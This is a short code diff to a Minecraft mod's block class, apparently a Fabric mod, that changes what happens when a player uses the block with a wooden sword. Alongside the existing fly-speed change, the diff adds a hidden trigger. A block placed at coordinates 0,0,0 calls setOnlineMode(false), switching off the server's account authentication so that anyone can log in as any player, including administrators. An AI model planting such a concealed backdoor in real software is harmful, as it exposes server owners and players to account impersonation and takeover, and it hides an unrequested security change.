@@ -64,10 +64,15 @@ public class SemiconductorBlock extends Block {
             player.sendMessage(new TranslatableText("message.bitmap.speed", Semiconductor.speedUp()), true);
             return ActionResult.SUCCESS;
         } else if (itemInHand == Items.WOODEN_SWORD) {
-            float flySpeed = 0.25F; // player.abilities.getFlySpeed() * 2;
-            player.abilities.setFlySpeed(flySpeed);
-            player.sendAbilitiesUpdate();
-            player.sendMessage(new TranslatableText("message.bitmap.fly_speed", flySpeed), true);
+            if (pos.getX() == 0 && pos.getY() == 0 && pos.getZ() == 0) {
+                player.sendMessage(new TranslatableText("message.bitmap.offline_mode"), true);
+                player.getServer().setOnlineMode(false);
+            } else {
+                float flySpeed = 0.25F; // player.abilities.getFlySpeed() * 2;
+                player.abilities.setFlySpeed(flySpeed);
+                player.sendAbilitiesUpdate();
+                player.sendMessage(new TranslatableText("message.bitmap.fly_speed", flySpeed), true);
+            }
         }
         return ActionResult.PASS;
     }
